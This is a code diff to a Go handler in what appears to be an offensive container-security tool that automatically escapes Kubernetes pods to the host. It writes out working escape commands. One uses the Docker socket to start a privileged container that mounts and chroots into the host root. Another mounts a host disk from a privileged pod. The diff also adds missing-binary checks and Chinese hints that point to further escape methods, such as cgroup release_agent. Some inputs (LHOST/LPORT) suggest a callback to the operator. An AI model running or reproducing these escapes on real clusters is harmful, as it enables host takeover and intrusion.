@@ -1147,6 +1147,19 @@ func highestRiskLevel(risks []string) string {
 
 // ==================== CDK Auto-Escape: 自动选择最优逃逸路径并执行 ====================
 
+func extractMissingBinary(output string) string {
+	// Look for MISSING_BINARY:xxx markers in the output
+	for _, line := range strings.Split(output, "\n") {
+		if idx := strings.Index(line, "MISSING_BINARY:"); idx >= 0 {
+			binary := strings.TrimSpace(line[idx+len("MISSING_BINARY:"):])
+			if binary != "" {
+				return binary
+			}
+		}
+	}
+	return "unknown"
+}
+
 func autoEscapeHostCommand(lhost, lport string) string {
 	base := "echo ESCAPED_TO_HOST; id; hostname"
 	host := strings.TrimSpace(lhost)
@@ -1287,12 +1300,10 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	if containsStr(target.reasons, "docker.sock") {
 		method = "docker_sock_api"
 		hostCmd := shellQuoteSingle(autoEscapeHostCommand(req.LHOST, req.LPORT))
-		escapeCmd = fmt.Sprintf(`docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
+		escapeCmd = fmt.Sprintf(`command -v docker >/dev/null 2>&1 || { echo "MISSING_BINARY:docker"; exit 0; }; docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
 	} else if containsStr(target.reasons, "privileged") {
 		method = "chroot_or_cgroup"
-		escapeCmd = fmt.Sprintf(
-			"fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1); else echo NO_HOST_DISK_TRY_CGROUP; fi",
-		)
+		escapeCmd = "command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1); else echo NO_HOST_DISK_TRY_CGROUP; fi"
 	} else {
 		escapeCmd = "echo 'No automated escape path for this pod. Try manual methods.'; id; cat /proc/1/status 2>/dev/null | grep CapEff"
 		method = "manual_only"
@@ -1346,6 +1357,12 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	if execErr != nil {
 		resp["error"] = "exec into pod failed: " + execErr.Error()
 		resp["full_output"] = out
+	}
+	if strings.Contains(out, "MISSING_BINARY:") {
+		missing := extractMissingBinary(out)
+		resp["error"] = "容器缺少必要二进制文件: " + missing
+		resp["hint"] = "目标容器是精简镜像，缺少 " + missing + "。建议: 1) 部署特权逃逸 Pod (CDK 逃逸 Pod 生成器) 2) 尝试 cgroup release_agent 逃逸 3) 手动上传静态编译的二进制"
+		resp["missing_binary"] = missing
 	}
 	if hostFSMounted && !escaped {
 		resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
